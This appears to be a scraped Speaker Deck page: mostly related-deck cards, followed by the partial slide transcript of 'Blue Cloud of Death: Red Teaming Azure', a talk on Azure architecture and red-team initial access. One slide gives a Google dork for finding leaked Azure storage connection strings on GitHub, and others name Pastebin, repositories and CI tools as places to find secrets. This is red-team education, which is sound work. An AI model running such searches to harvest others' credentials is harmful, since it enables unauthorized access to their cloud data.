+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/465724d73fe3a92c0879fdfb43a3a6f3?s=48" alt="465724d73fe3a92c0879fdfb43a3a6f3?s=48" />
+              philhawksworth
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 193
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="8,892 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 8.9k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/eitanlees/visualization" title="Visualization">
+      <div class="card deck-preview" data-id="d85e14f914754d4da76fb9682fe24bd4" data-slide-count="78" data-cover-image="https://files.speakerdeck.com/presentations/d85e14f914754d4da76fb9682fe24bd4/preview_slide_0.jpg?14177923">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/d85e14f914754d4da76fb9682fe24bd4/preview_slide_0.jpg?14177923');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/d85e14f914754d4da76fb9682fe24bd4/preview_slide_0.jpg?14177923');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/170b760e0147792d0140e59ec78e9893?s=48" alt="170b760e0147792d0140e59ec78e9893?s=48" />
+              eitanlees
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 116
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="10,277 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 10k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/chrislema/infographics-made-easy" title="Infographics Made Easy">
+      <div class="card deck-preview" data-id="505075265e3db9000205e4c7" data-slide-count="30" data-cover-image="https://files.speakerdeck.com/presentations/505075265e3db9000205e4c7/preview_slide_0.jpg?131380">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/505075265e3db9000205e4c7/preview_slide_0.jpg?131380');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/505075265e3db9000205e4c7/preview_slide_0.jpg?131380');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/282d599b414022eba5096510f675b6e2?s=48" alt="282d599b414022eba5096510f675b6e2?s=48" />
+              chrislema
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 231
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="16,030 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 16k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/bryan/music-morning-musume" title="Music &amp; Morning Musume">
+      <div class="card deck-preview" data-id="4d58ce975753086fb100003e" data-slide-count="57" data-cover-image="https://files.speakerdeck.com/presentations/4d58ce975753086fb100003e/preview_slide_0.jpg?525097">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4d58ce975753086fb100003e/preview_slide_0.jpg?525097');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4d58ce975753086fb100003e/preview_slide_0.jpg?525097');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/a60068bce2e73de3a37ca9d2dbe36092?s=48" alt="A60068bce2e73de3a37ca9d2dbe36092?s=48" />
+              bryan
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 32
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="3,510 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 3.5k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/addyosmani/velocityconf-rendering-performance-case-studies" title="VelocityConf: Rendering Performance Case Studies">
+      <div class="card deck-preview" data-id="76ff3a902e8b0131b9452adb14392f56" data-slide-count="203" data-cover-image="https://files.speakerdeck.com/presentations/76ff3a902e8b0131b9452adb14392f56/preview_slide_0.jpg?2273607">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/76ff3a902e8b0131b9452adb14392f56/preview_slide_0.jpg?2273607');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/76ff3a902e8b0131b9452adb14392f56/preview_slide_0.jpg?2273607');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/96270e4c3e5e9806cf7245475c00b275?s=48" alt="96270e4c3e5e9806cf7245475c00b275?s=48" />
+              addyosmani
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 312
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="21,133 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 21k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/brettharned/making-projects-easy" title="Making Projects Easy">
+      <div class="card deck-preview" data-id="3be4771013d70131f9ff3aacfc01551e" data-slide-count="56" data-cover-image="https://files.speakerdeck.com/presentations/3be4771013d70131f9ff3aacfc01551e/preview_slide_0.jpg?2090835">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/3be4771013d70131f9ff3aacfc01551e/preview_slide_0.jpg?2090835');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/3be4771013d70131f9ff3aacfc01551e/preview_slide_0.jpg?2090835');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/c4de88ea47538e4594750e3861a341c8?s=48" alt="C4de88ea47538e4594750e3861a341c8?s=48" />
+              brettharned
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 93
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="3,125 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 3.1k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/shpigford/4-signs-your-business-is-dying" title="4 Signs Your Business is Dying">
+      <div class="card deck-preview" data-id="01edd780c7e0013168aa3a2cd771e4db" data-slide-count="49" data-cover-image="https://files.speakerdeck.com/presentations/01edd780c7e0013168aa3a2cd771e4db/preview_slide_0.jpg?3074513">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/01edd780c7e0013168aa3a2cd771e4db/preview_slide_0.jpg?3074513');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/01edd780c7e0013168aa3a2cd771e4db/preview_slide_0.jpg?3074513');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/e4f5d494ebdc9e7cce1aecf3ce3e8bc1?s=48" alt="E4f5d494ebdc9e7cce1aecf3ce3e8bc1?s=48" />
+              shpigford
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 166
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="18,962 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 19k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/ddemaree/designing-the-hi-dpi-web" title="Designing the Hi-DPI Web">
+      <div class="card deck-preview" data-id="506f5a08240f510002028728" data-slide-count="120" data-cover-image="https://files.speakerdeck.com/presentations/506f5a08240f510002028728/preview_slide_0.jpg?186083">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/506f5a08240f510002028728/preview_slide_0.jpg?186083');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/506f5a08240f510002028728/preview_slide_0.jpg?186083');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/c157b16234f1e75e8eac3698c1d4414a?s=48" alt="C157b16234f1e75e8eac3698c1d4414a?s=48" />
+              ddemaree
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 273
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="31,487 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 31k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/shpigford/from-idea-to-5000-dollars-a-month-in-5-months" title="From Idea to $5000 a Month in 5 Months">
+      <div class="card deck-preview" data-id="00d54850989c01316bc75a0ef259ba4d" data-slide-count="46" data-cover-image="https://files.speakerdeck.com/presentations/00d54850989c01316bc75a0ef259ba4d/preview_slide_0.jpg?2874749">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/00d54850989c01316bc75a0ef259ba4d/preview_slide_0.jpg?2874749');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/00d54850989c01316bc75a0ef259ba4d/preview_slide_0.jpg?2874749');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/e4f5d494ebdc9e7cce1aecf3ce3e8bc1?s=48" alt="E4f5d494ebdc9e7cce1aecf3ce3e8bc1?s=48" />
+              shpigford
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 370
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="42,469 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 42k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+      </div>
+  </div>
+</div>
+
+  <div class="container py-4 transcript">
+    <h2 class="mb-4">Transcript</h2>
+    <ol>
+        <li class="mb-2">
+            <h3>
+              <a alt="BLUE CLOUD
+OF DEATH
+Red Teaming Azure
+" title="Blue Cloud of Death: Red Teaming Azure BLUE CLOUD
+OF DEATH
+Red Teaming Azure
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_0.jpg">BLUE CLOUD OF DEATH Red Teaming Azure</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AGENDA
+…
+Agenda
+• Who Am I?
+• Azure Overview
+• ..." title="Blue Cloud of Death: Red Teaming Azure AGENDA
+…
+Agenda
+• Who Am I?
+• Azure Overview
+• ..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_1.jpg">AGENDA … Agenda • Who Am I? • Azure Overview</a>
+            </h3>
+            • Initial Access • Storage Access • Endpoint Access • Expanding Access • Persisting Access Bryce Kunz @TweekFawkes
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Whois
+…
+" title="Blue Cloud of Death: Red Teaming Azure Whois
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_2.jpg">Whois …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="THE PAST
+RED &amp; BLUE...
+Red Team
+Adobe
+Digital E..." title="Blue Cloud of Death: Red Teaming Azure THE PAST
+RED &amp;amp; BLUE...
+Red Team
+Adobe
+Digital E..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_3.jpg">THE PAST RED &amp; BLUE... Red Team Adobe Digital Experience</a>
+            </h3>
+            (DX) Bryce Kunz @TweekFawkes Offense NSA Defense DHS SOC
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="THE PRESENT
+CYBER SECURITY SERVICES
+Stage 2 Sec..." title="Blue Cloud of Death: Red Teaming Azure THE PRESENT
+CYBER SECURITY SERVICES
+Stage 2 Sec..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_4.jpg">THE PRESENT CYBER SECURITY SERVICES Stage 2 Security BSidesSLC (</a>
+            </h3>
+            CyberSecurity Services ) ( By &amp; For the People ) Stage2Sec.com BSidesSLC.org Bryce Kunz @TweekFawkes
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="TRAINING
+AWS &amp; AZURE EXPLOITATION:
+MAKING THE C..." title="Blue Cloud of Death: Red Teaming Azure TRAINING
+AWS &amp;amp; AZURE EXPLOITATION:
+MAKING THE C..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_5.jpg">TRAINING AWS &amp; AZURE EXPLOITATION: MAKING THE CLOUD RAIN SHELLS!</a>
+            </h3>
+            CNO.io -Training (Salt Lake City, Utah) July 12th &amp; 13th SOLD OUT! BlackHat USA (Las Vegas, NV) August
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure Overview
+…
+" title="Blue Cloud of Death: Red Teaming Azure Azure Overview
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_6.jpg">Azure Overview …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CLOUD
+Azure CIoud
+My boss assured me,
+that’s al..." title="Blue Cloud of Death: Red Teaming Azure CLOUD
+Azure CIoud
+My boss assured me,
+that’s al..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_7.jpg">CLOUD Azure CIoud My boss assured me, that’s all we</a>
+            </h3>
+            needed to know… :P
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DESIGN
+Azure CIoud
+Portal Control Data
+cloud de..." title="Blue Cloud of Death: Red Teaming Azure DESIGN
+Azure CIoud
+Portal Control Data
+cloud de..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_8.jpg">DESIGN Azure CIoud Portal Control Data cloud demystified!</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="ADMINS
+Azure CIoud
+Portal Control Data
+Admin
+…
+" title="Blue Cloud of Death: Red Teaming Azure ADMINS
+Azure CIoud
+Portal Control Data
+Admin
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_9.jpg">ADMINS Azure CIoud Portal Control Data Admin …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CONTROL
+Azure CIoud
+Portal Control Data
+Admin
+…..." title="Blue Cloud of Death: Red Teaming Azure CONTROL
+Azure CIoud
+Portal Control Data
+Admin
+…..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_10.jpg">CONTROL Azure CIoud Portal Control Data Admin … From our</a>
+            </h3>
+            vantage point … … mostly just REST APIs …
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DATA
+Azure CIoud
+Portal Control Data
+Admin
+… he..." title="Blue Cloud of Death: Red Teaming Azure DATA
+Azure CIoud
+Portal Control Data
+Admin
+… he..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_11.jpg">DATA Azure CIoud Portal Control Data Admin … here lies</a>
+            </h3>
+            user/customer/account data …
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="SERVICES
+Azure CIoud
+Portal
+VMs
+Control
+Storage..." title="Blue Cloud of Death: Red Teaming Azure SERVICES
+Azure CIoud
+Portal
+VMs
+Control
+Storage..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_12.jpg">SERVICES Azure CIoud Portal VMs Control Storage Data Apps Admin</a>
+            </h3>
+            …too many for any human to care about… LBs
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="SERVICES
+Portal
+VMs
+Control
+Storage
+Data
+Apps
+A..." title="Blue Cloud of Death: Red Teaming Azure SERVICES
+Portal
+VMs
+Control
+Storage
+Data
+Apps
+A..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_13.jpg">SERVICES Portal VMs Control Storage Data Apps Admin …too many</a>
+            </h3>
+            for any human to care about… LBs Azure CIoud
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AGENTS
+Azure CIoud
+Portal
+VMs
+Control
+Storage
+D..." title="Blue Cloud of Death: Red Teaming Azure AGENTS
+Azure CIoud
+Portal
+VMs
+Control
+Storage
+D..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_14.jpg">AGENTS Azure CIoud Portal VMs Control Storage Data Apps Admin</a>
+            </h3>
+            … LBs Agent
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DEVS
+Azure CIoud
+Portal Control
+Storage
+Data
+Ap..." title="Blue Cloud of Death: Red Teaming Azure DEVS
+Azure CIoud
+Portal Control
+Storage
+Data
+Ap..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_15.jpg">DEVS Azure CIoud Portal Control Storage Data Apps Admin …</a>
+            </h3>
+            LBs … Dev CI Pipeline VMs
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="USERS
+Azure CIoud
+Portal Control
+Storage
+Data
+A..." title="Blue Cloud of Death: Red Teaming Azure USERS
+Azure CIoud
+Portal Control
+Storage
+Data
+A..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_16.jpg">USERS Azure CIoud Portal Control Storage Data Apps Admin …</a>
+            </h3>
+            LBs … CI Pipeline Users VMs Dev
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Dooms Day
+…
+" title="Blue Cloud of Death: Red Teaming Azure Dooms Day
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_17.jpg">Dooms Day …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DEVOP-OCALYPSE
+Bryce Kunz - @TweekFawkes
+… $50k..." title="Blue Cloud of Death: Red Teaming Azure DEVOP-OCALYPSE
+Bryce Kunz - @TweekFawkes
+… $50k..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_18.jpg">DEVOP-OCALYPSE Bryce Kunz - @TweekFawkes … $50k!?!?!?</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DEVOP-OCALYPSE
+Bryce Kunz - @TweekFawkes
+…EC2 i..." title="Blue Cloud of Death: Red Teaming Azure DEVOP-OCALYPSE
+Bryce Kunz - @TweekFawkes
+…EC2 i..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_19.jpg">DEVOP-OCALYPSE Bryce Kunz - @TweekFawkes …EC2 instances destroyed…</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Accounts
+…
+" title="Blue Cloud of Death: Red Teaming Azure Accounts
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_20.jpg">Accounts …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="ACCOUNTS
+…
+Customer Types:
+• Standard
+• Enterpr..." title="Blue Cloud of Death: Red Teaming Azure ACCOUNTS
+…
+Customer Types:
+• Standard
+• Enterpr..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_21.jpg">ACCOUNTS … Customer Types: • Standard • Enterprise Agreement •</a>
+            </h3>
+            - Departments Account Admin Service Admin Co-Admin Subscription (e.g. IT) Azure Account (Center) Subscription (e.g. R&amp;D) RG Stage RG Prod R R R R RG Stage RG Prod R R R R Service Admin Co-Admin
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Initial Access
+…
+" title="Blue Cloud of Death: Red Teaming Azure Initial Access
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_22.jpg">Initial Access …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="OSINT
+Azure CIoud
+Portal Control
+Storage
+Data
+A..." title="Blue Cloud of Death: Red Teaming Azure OSINT
+Azure CIoud
+Portal Control
+Storage
+Data
+A..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_23.jpg">OSINT Azure CIoud Portal Control Storage Data Apps Admin …</a>
+            </h3>
+            LBs … CI Pipeline Users VMs Dev Internet Collaboration Hacker
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="GITHUB
+Bryce Kunz - @TweekFawkes
+Google Dork:
+s..." title="Blue Cloud of Death: Red Teaming Azure GITHUB
+Bryce Kunz - @TweekFawkes
+Google Dork:
+s..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_24.jpg">GITHUB Bryce Kunz - @TweekFawkes Google Dork: site:github.com web.config &quot;StorageConnectionString&quot;</a>
+            </h3>
+            &quot;DefaultEndpointsProtocol&quot;
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="PASTEBIN
+Bryce Kunz - @TweekFawkes
+Find a Azure..." title="Blue Cloud of Death: Red Teaming Azure PASTEBIN
+Bryce Kunz - @TweekFawkes
+Find a Azure..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_25.jpg">PASTEBIN Bryce Kunz - @TweekFawkes Find a Azure Secrets •</a>
+            </h3>
+            Collaboration • - PasteBin.com
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="REPOS
+Azure CIoud
+Portal Control
+Storage
+Data
+A..." title="Blue Cloud of Death: Red Teaming Azure REPOS
+Azure CIoud
+Portal Control
+Storage
+Data
+A..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_26.jpg">REPOS Azure CIoud Portal Control Storage Data Apps Admin …</a>
+            </h3>
+            LBs … CI Pipeline Users VMs Dev Internet Collaboration Hacker Repos
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="BITBUCKET
+Bryce Kunz - @TweekFawkes
+Find a Azur..." title="Blue Cloud of Death: Red Teaming Azure BITBUCKET
+Bryce Kunz - @TweekFawkes
+Find a Azur..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_27.jpg">BITBUCKET Bryce Kunz - @TweekFawkes Find a Azure Secrets •</a>
+            </h3>
+            Open Source Intel • Code Repositories • - BitBucket, GitLab • - Gerrit, GitBlit, Git • - SVN, etc…
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CI
+Azure CIoud
+Portal Control
+Storage
+Data
+Apps..." title="Blue Cloud of Death: Red Teaming Azure CI
+Azure CIoud
+Portal Control
+Storage
+Data
+Apps..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_28.jpg">CI Azure CIoud Portal Control Storage Data Apps Admin …</a>
+            </h3>
+            LBs … CI Pipeline Users VMs Dev Internet Collaboration Hacker Repos
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DEPLOY
+ACCESS
+Bryce Kunz - @TweekFawkes
+Find a ..." title="Blue Cloud of Death: Red Teaming Azure DEPLOY
+ACCESS
+Bryce Kunz - @TweekFawkes
+Find a ..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_29.jpg">DEPLOY ACCESS Bryce Kunz - @TweekFawkes Find a Azure Secrets</a>
+            </h3>
+            • Open Source Intel • Code Repositories • Deployment Tools • - Puppet, etc… • - Jenkins, etc…
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." title="Blue Cloud of Death: Red Teaming Azure Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_30.jpg">Azure CIoud Portal Control Storage Data Apps Admin … LBs</a>
+            </h3>
+            … CI Pipeline Users VMs Dev Internet Collaboration Hacker Repos ENDPOINT
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="HACK &amp; D/L
+ACCESS
+Bryce Kunz - @TweekFawkes
+Fin..." title="Blue Cloud of Death: Red Teaming Azure HACK &amp;amp; D/L
+ACCESS
+Bryce Kunz - @TweekFawkes
+Fin..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_31.jpg">HACK &amp; D/L ACCESS Bryce Kunz - @TweekFawkes Find a</a>
+            </h3>
+            Azure Secrets • Open Source Intel • Code Repositories • Deployment Tools • Configuration Files • - Classic Hacks • -- D/L Secrets
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." title="Blue Cloud of Death: Red Teaming Azure Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_32.jpg">Azure CIoud Portal Control Storage Data Apps Admin … LBs</a>
+            </h3>
+            … CI Pipeline Users VMs Dev Internet Collaboration Hacker Repos MANY ROADS TO PWNAGE
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="I
+Heart
+AWS
+&amp;
+Azure!
+Just in case you think AWS..." title="Blue Cloud of Death: Red Teaming Azure I
+Heart
+AWS
+&amp;amp;
+Azure!
+Just in case you think AWS..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_33.jpg">I Heart AWS &amp; Azure! Just in case you think</a>
+            </h3>
+            AWS or Azure is bad… Here is what I really like about it! • Assessment Management is Awesome! • Scaling of Logging can be Amazing! • Read-Only / Auditor Access is Easy to Setup!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure Storage
+…
+" title="Blue Cloud of Death: Red Teaming Azure Azure Storage
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_34.jpg">Azure Storage …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STORAGE
+…
+VMs
+Storage
+LBs
+Users
+Web Server
+Apps
+" title="Blue Cloud of Death: Red Teaming Azure STORAGE
+…
+VMs
+Storage
+LBs
+Users
+Web Server
+Apps
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_35.jpg">STORAGE … VMs Storage LBs Users Web Server Apps</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STORAGE
+…
+VMs
+Storage
+LBs
+Users
+Web Server
+Apps..." title="Blue Cloud of Death: Red Teaming Azure STORAGE
+…
+VMs
+Storage
+LBs
+Users
+Web Server
